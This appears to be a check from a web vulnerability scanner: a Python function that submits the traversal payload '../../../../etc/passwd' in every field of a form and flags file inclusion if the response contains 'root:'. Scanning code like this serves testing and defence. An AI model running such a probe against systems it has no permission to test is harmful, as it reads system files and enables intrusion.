def test(url, form, session):
    payload = "../../../../etc/passwd"
    data = {i['name']: payload for i in form['inputs'] if i['type'] != 'submit'}
    try:
        action_url = url + form['action'] if form['action'] else url
        res = session.get(action_url, params=data)
        if "root:" in res.text:
            return {"vulnerability": "File Inclusion", "url": action_url, "evidence": "/etc/passwd"}
    except:
        pass
    return None
